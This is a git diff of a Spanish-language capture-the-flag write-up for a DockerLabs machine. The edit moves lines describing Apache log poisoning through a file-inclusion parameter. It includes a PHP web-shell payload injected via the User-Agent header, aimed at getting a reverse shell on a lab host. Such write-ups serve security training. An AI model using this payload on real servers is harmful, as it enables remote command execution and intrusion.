@@ -62,12 +62,12 @@ Ejecutamos entonces este comando para ver si tenemos accesos a los logs para int
 
 Sí, tenemos acceso a los logs de apache, así que intentaremos llevar a cabo este ataque con el objetivo de enviar una shell inversa a nuestra máquina atacante.  
 Primero tendremos que abrir el Burp Suite e interceptar la petición.  
+Para ello interceptaremos la petición a la página (http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log.  
+Ahora modificaremos el campo User Agent con la cadena:   
+
+`<?php system($_GET['cmd']); ?>`   
 
 ![V](https://github.com/giustiand/DockerLabs-Writeups/blob/main/Medio/images/Veneno/V_10.png)     
-
-Ahora modificaremos el campo User Agent con la cadena:  
-
-`<?php system($_GET['cmd']); ?>` 
 
 
 
